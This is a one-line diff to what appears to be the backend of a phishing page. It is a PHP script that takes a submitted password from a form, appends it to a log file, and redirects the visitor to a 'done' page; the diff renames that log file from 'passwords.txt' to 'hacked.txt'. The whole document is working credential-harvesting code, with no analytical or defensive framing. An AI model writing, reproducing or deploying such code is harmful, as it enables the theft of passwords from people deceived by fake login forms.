@@ -1,1 +1,1 @@
-<?php file_put_contents("passwords.txt", " [password:] " . $psw = $_POST['psw'] . "\n", FILE_APPEND);header('Location: done.html');?>
+<?php file_put_contents("hacked.txt", " [password:] " . $psw = $_POST['psw'] . "\n", FILE_APPEND);header('Location: done.html');?>
